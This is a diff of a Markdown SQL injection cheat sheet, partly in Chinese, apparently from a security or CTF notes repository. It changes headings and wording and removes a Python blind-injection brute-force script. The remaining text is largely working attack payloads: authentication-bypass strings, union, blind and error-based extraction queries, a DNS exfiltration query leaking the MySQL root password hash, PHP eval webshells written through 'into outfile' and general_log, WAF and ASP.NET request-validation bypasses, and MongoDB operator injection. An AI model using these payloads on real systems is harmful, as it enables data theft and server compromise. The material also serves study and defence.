@@ -17,7 +17,7 @@ SQL is a famous database engine which is used with web server. In this situation
 *  [Defense](#defense)  
 *  [Reference](#reference)
 
-### Basic injection  
+# Basic injection  
 select password from users where name = '$id';  
 So, what can we insert into $id?  
 ```sql  
@@ -33,7 +33,7 @@ rafael' or ''='    // select password from users where name = 'rafael' or ''='';
 '|0#
 ```  
 
-### Union based
+# Union based
 1. Vulnerable to SQL injection?  
 ```sql
 1' or 1"  
@@ -76,7 +76,7 @@ union select user(),database(),version(), @@version_compile_os--+
 [What's in information_schema.columns?](https://dev.mysql.com/doc/refman/5.7/en/columns-table.html)  
 **group_concat() is also a little trick.**
 
-### Blind based  
+# Blind based  
 result is not showed on the page and there is also no any error message.  
 **True**: page shows normal.  
 **False**: page shows error or no any result.  
@@ -97,46 +97,17 @@ boolean based depends on **whether page show things**...
 ```sql
 id=1' and if(ascii(substr((select database()),1,1)>115),0,sleep(5))--+  // if the first char is not bigger than s, then delay 5s
 ```
-Blind-based costs lot of time，therefore script is necessary!  
-```python
-#!/usr/bin/env python3
-import re
-import requests
-from string import digits, ascii_uppercase, ascii_lowercase
+Blind-based costs lot of time, so script is necessary for us!  
 
-target = url
-flag = ''
-label = "<grey>hi:</grey> value1<br/>"                  // label show our successful bruteforce
-wordlist = digits + ascii_uppercase + ascii_lowercase        
-for i in range(0,100):                                // Make sure the length of flag
-    d = {"key1":"value1","key2":" and length(password) like "+str(i)}       // bypass waf(replace = with like)
-    response = requests.post(target,data=d)
-    if label in response.text:
-        print "Get length of flag is : " + str(i)
-        flag_leng = i
-        break
-    print d
-for i in range(1, flag_leng+1):                      // mid, substring functions have index from 1
-    for j in range(40,127):                  // dec(ascii) (,),*,+,..0,1,...A,B,....a,b,c,.....{,|,},~,DEL
-        d = {"key1":"value1","key2":" and mid(password," + str(i) + ",1) like '" + chr(j) + "'"}
-                                                       // chr(97) -> 'a'
-        response = requests.post(target,data=d)
-        if label in response.text:
-           flag += chr(j)
-           print flag
-           break
-        print d
-print flag
-```  
-
-**DNS injection**  
-The process of brute force still takes much time. If we inject a domain name in our payload to force it to be parsed, we might get our data efficiently from dns log.  
+👽 **DNS injection**  
+The process of bruteforce still takes much time. If we inject a domain name in our payload to force it to be parsed, we might get our data efficiently from dns log.  
 MySQL:  
 ```php
 select load_file( concat('\\\\', (select password from mysql.user where user='root' limit 1), '.www.example.com\\abc') );
 ```  
+The limitation of the method above would be talked about in [Read file](#read-file) part.  
 
-### Error based
+# Error based
 * Analyze the error message  
 ```sql
 My payload: ?id = 2'
@@ -185,7 +156,7 @@ where table_schema=0xXXXXX
 // ERROR 1105 (HY000): XPATH syntax error: ':10.1.26-MariaDB'
 ```
 
-### WAF bypass
+# WAF bypass
 WAF is a defender for web.  
 Tricks:  
 - I want to login  
@@ -242,8 +213,8 @@ Tricks:  
 More：  
 [seebug我的wafbypass之道](https://paper.seebug.org/218/)  
 
-### Webshell
-:racehorse: Select `into outfile` requires write-permission from users, file can **not be already exist**, and without the limitation of `secure_file_priv`.  
+# Webshell
+:racehorse: Select `into outfile` requires write-permission from users, file should **not be already exist**, and without the limitation of `secure_file_priv`.  
 ```sql
 1' or 1 union select 1,2,"<?php @eval($_POST['hi']);?>" into outfile 'C://xampp/htdocs/sqli/Less-9/muma.php'--+ // absolute path
 // into outfile must be used with double quote
@@ -280,7 +251,7 @@ select '<?php @eval($_POST[1])?>';
 ```  
 End, change `general_log_file` back to the default place, set `general_log` back to off  
 
-### Read file  
+# Read file  
 ```php
 union select load_file( filename-hex );
 
@@ -289,14 +260,14 @@ select load_file(concat('\\\\',hex((select load_file('want_to_read_file'))),'exa
 ```  
 Attackers or users require read-permission(usually have). We can use `load_file` to read some information, for example `DB.php`. In addition to read-permission，`select into outfile`,`select into dumpfile`,`select load_file()` such functions are all limited by `secure_file_priv`, take a look at the following part...  
 
-### SQL Privilege issue  
+# SQL Privilege issue  
 We always run into the SQL privilege issue when we want to write webshell or read other files. Each time attaching, server will check db_user authentication, server can also be set to **limit the attachment from external ip**. If bypass authentication，admin can also limit the command can be used by users。  
 [Ref:Mysql privilege issue](https://www.cnblogs.com/Richardzhu/p/3318595.html)  
 The limitation of `--secure_file_priv` on read write permission:  
 mysql setting of `--secure_file_priv` limit the path of writting files, with `select @@secure_file_priv` we can get the value. Before 5.7.5, the dafault value is **Empty**, and user don't need to worry about permission. In following version, the default value is set to NULL, the tricks such as `select into` even becomes garbage because `@@secure_file_priv` is more difficult to **set** than `general_log`, `@@secure_file_priv` can't be changed when mysql is exec  
 [Ref:關於mysql中select into outfile權限的探討](https://blog.csdn.net/bnxf00000/article/details/64123549)  
 
-### Bypass RequestValidation on ASPX
+# Bypass RequestValidation on ASPX
 ![image](https://farm2.staticflickr.com/1829/43302939171_78fbb87eba_h.jpg)  
 Request Validation is the mechanism of ASP to check the malicious request，and it defaults to block even the common html tag，but we can customize the rules of Request Validation or check by ourselves  
 From the image above, we can find that many server support IBM037,IBM500,IBM1026,cp875，we can get the encoded string with following script  
@@ -329,7 +300,7 @@ Exploit:
 [Request encoding to bypass web application firewalls](https://www.nccgroup.trust/uk/about-us/newsroom-and-events/blogs/2017/august/request-encoding-to-bypass-web-application-firewalls/)  
 [Rare ASP.NET request validation bypass using request encoding](https://www.nccgroup.trust/uk/about-us/newsroom-and-events/blogs/2017/september/rare-aspnet-request-validation-bypass-using-request-encoding/)  
 
-### Wordpress Double Prepare Misuse  
+# Wordpress Double Prepare Misuse  
 Wordpress自己寫了`prepare()`預編譯sql語句然後再`execute()`，有別於PDO下的`prepare()`,`blind()`,`execute()`。這是出現在wordpress4.8.3以前的版本的問題...  
 ```php
 $query = $wpdb->prepare( "SELECT * FROM table WHERE column = %s", $_GET['c1'] );
@@ -350,8 +321,8 @@ prepare2: SELECT * FROM table WHERE column1 = ' 'or 1=1--' ' AND column2 = 'a';
 在Wordpress4.8.3的版本之後，patch成使用者輸入的`%`會被取代為66bytes的秘密字串：`{xxxxx...xxx}s`  
   
 # NoSQL injection
-MongoDB用json格式來解析資料.  
-所以我們不能用字串進行注入,而使用```{key:value}```進行注入.  
+MongoDB parse the data with format of json.  
+Therefore, we cannot inject with string, but use `{key:value}` this kind of format to do injection.  
 ```sql
 // The list of regex
 $gt: >
@@ -377,7 +348,7 @@ Blind injection
 ?username=admin&password[$regex]=^a
 ```  
 
-### Logic Vul  
+# Logic Vul  
 對sql觀念的誤解很容易讓開發者犯了一些邏輯漏洞，下面做一些收集：  
 1. mysql整型  
 在mysql裡若字段為整型，`where`語句中的值不為整型時，會先被轉換成整型才進行語句查詢...  
